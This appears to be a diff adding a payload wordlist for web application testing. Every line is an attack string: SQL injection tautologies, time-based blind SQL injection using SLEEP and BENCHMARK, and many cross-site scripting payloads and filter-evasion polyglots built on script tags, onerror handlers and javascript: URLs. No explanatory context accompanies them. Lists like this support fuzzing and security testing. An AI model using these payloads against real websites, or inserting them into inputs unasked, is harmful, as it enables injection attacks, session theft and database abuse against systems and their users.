@@ -1,0 +1,28 @@
+'
+>
+'>
+'>">
+'1 or 1==1--
+' or 1==1
+[]
+{}
+article.php?title=<meta%20http-equiv="refresh"%20content="0;">
+'><script>alert(1)</script>
+"><img src="x:x" onerror="alert(0)">
+"><iframe src="javascript:alert(0)">
+<img%20src='aaa'%20onerror=alert(1)>
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+'%2Bbenchmark(3200,SHA1(1))%2B'
+'+BENCHMARK(40000000,SHA1(1337))+'
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode
+    (88,83,83))//";alert(String.fromCharCode(88,83,83))//--><SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))
+    </SCRIPT>
+">><marquee><img src=x onerror=confirm(1)></marquee>"
+    ></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex
+    formaction=javascript:alert(/XSS/) type=submit>'-->"
+    ></script><script>alert(1)</script>"><img/id="confirm&amp;amp;amp;lpar;
+    1)"/alt="/"src="/"onerror=eval(id&amp;amp;amp;%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+\%22})))}catch(e){alert(document.domain);}//
+"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
+"a")(({type:"ready"}));}catch(e){alert(1)}//
